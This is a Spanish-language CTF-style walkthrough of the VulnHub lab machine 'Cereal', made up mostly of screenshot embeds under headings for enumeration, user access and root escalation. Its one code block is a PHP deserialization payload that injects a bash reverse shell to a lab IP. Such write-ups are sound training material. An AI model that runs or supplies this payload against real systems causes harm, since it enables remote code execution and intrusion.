[[Vulnhub]] [[Disiplinas.]]

![[Pasted image 20230727104520.png]]

---
Martes 25 de Julio del 2023 Mexico.
CDMX-Polanco
Valente Spiegel

![[Pasted image 20230727103950.png]]

---

### Habilidades. 

Enumeración FTP 
Hospedaje Virtual 
Enumeración de Subdominios 
Divulgación de Información - Descubrimiento de Archivos de Respaldo 
Ataque de Deserialización PHP [RCE] 
Enumeración de Tareas Programadas (pspy) 
Abuso de Tarea Programada (Chown Symlink) [Escalada de Privilegios]

### Certificaciones.

eWPT  
eCPPTv2

---
### Creación de directorios para espacio de trabajo.

Es importante crear directorios o espacios de trabajo específicos al resolver una máquina.
Al crear un directorio o espacio de trabajo dedicado para una máquina de VulnHub, puedes mantener ordenada toda la información relacionada con esa máquina en un solo lugar. Esto incluye archivos de configuración, resultados de escaneos, notas y cualquier otro dato relevante. Una estructura organizada facilita el seguimiento del progreso, el acceso rápido a la información y la revisión posterior de los pasos realizados.

```
mkdir Cereal && cd Cereal && mkdir {Scan,Content,Exploits,Evidencia} && ls && cd Scan
```
![[Pasted image 20230727104049.png]]

---
### Descubrimiento de ip.

![[Pasted image 20230727105129.png]]
![[Pasted image 20230727105149.png]]

![[Pasted image 20230727105202.png]]

---
### Enumeramiento de puertos.


![[Pasted image 20230727110135.png]]

![[Pasted image 20230727110522.png]]

![[Pasted image 20230727110826.png]]
![[Pasted image 20230727110959.png]]

---

### Escaneo y enumeración web.


![[Pasted image 20230727111137.png]]

![[Pasted image 20230727111155.png]]
![[Pasted image 20230727112833.png]]
![[Pasted image 20230727112954.png]]

![[Pasted image 20230727113008.png]]

![[Pasted image 20230727113053.png]]

![[Pasted image 20230727113221.png]]
![[Pasted image 20230727113253.png]]

![[Pasted image 20230727114323.png]]

![[Pasted image 20230727132412.png]]

![[Pasted image 20230727132520.png]]

![[Pasted image 20230727132610.png]]

![[Pasted image 20230727133223.png]]

![[Pasted image 20230727133239.png]]

![[Pasted image 20230727134002.png]]
![[Pasted image 20230727145311.png]]

![[Pasted image 20230727145517.png]]

![[Pasted image 20230801112158.png]]

---
### Escalamiento a usuario.

El código PHP que proporcionas parece tener la intención de serializar un objeto `pingTest` y luego imprimir el resultado codificado en URL. Sin embargo, hay un problema en la declaración de la propiedad `$ipAddress`. Parece que intentas ejecutar un comando de shell malicioso dentro de la propiedad, lo cual es una grave vulnerabilidad de seguridad.

El comando malicioso que se ha incluido en la propiedad `$ipAddress` es una forma de intentar obtener una shell inversa en el servidor objetivo. Es una práctica muy peligrosa e insegura, y no debería ser usada en ningún entorno, ya que podría ser utilizada para llevar a cabo ataques y acciones maliciosas.

```
<?php 
class pingTest { 
public $ipAddress = "; bash -c 'bash -i >& /dev/tcp/192.168.153.129/443 0>&1'"; 
public $isValid = True; 
public $output = ""; } 
echo urlencode(serialize(new pingTest)); 
?>
```

![[Pasted image 20230801115652.png]]

![[Pasted image 20230801115809.png]]

![[Pasted image 20230801120333.png]]

![[Pasted image 20230801120841.png]]

![[Pasted image 20230801120650.png]]

---
### Tratamiento de Shell y tty

![[Pasted image 20230801121316.png]]

![[Pasted image 20230801121420.png]]

![[Pasted image 20230801121536.png]]

---
### Usuario Rocky.


![[Pasted image 20230801122245.png]]

![[Pasted image 20230801122449.png]]

![[Pasted image 20230801125810.png]]

![[Pasted image 20230801130153.png]]

![[Pasted image 20230801130203.png]]

![[Pasted image 20230801130242.png]]
![[Pasted image 20230801130341.png]]

---
### Escalamiento a root.

![[Pasted image 20230801133848.png]]

![[Pasted image 20230801133928.png]]

![[Pasted image 20230801134531.png]]

![[Pasted image 20230801134736.png]]

![[Pasted image 20230801134851.png]]

![[Pasted image 20230801134940.png]]

![[Pasted image 20230801135032.png]]

![[Pasted image 20230801135058.png]]


